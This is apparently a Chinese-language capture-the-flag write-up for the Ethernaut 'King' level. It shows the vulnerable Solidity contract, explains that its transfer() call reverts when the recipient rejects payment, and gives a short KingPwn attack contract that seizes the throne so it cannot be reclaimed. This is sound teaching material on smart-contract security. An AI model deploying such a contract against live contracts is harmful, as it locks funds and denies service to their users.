# King


## 要求

```
下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.

这么有趣的游戏, 你的目标是攻破他.

当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.
```

## 代码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

## 分析

按照他这个写法，应该是在最后提交实例的时候，还会进入到 `receive`函数。
但是，但是，他调用了这个函数`payable(king).transfer(msg.value);`.

使用的`transfer`.transfer有一个问题，就是传输出错的时候，会调用`revert`。
也就说，只要实现`receive`或者`fallback`函数，他就没办法把钱转移回来。

## pwn

首先查看一下当前的prize:
```
await contract.prize().then(v=>v.toString())
'1000000000000000'
```
那我们只要被这个高就好了，

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingPwn{
    
    constructor()payable {

    }

    function pwn(address target)public {
        require(address(this).balance > 1000000000000000);
        address(target).call{value:address(this).balance}("");

    }
}
```
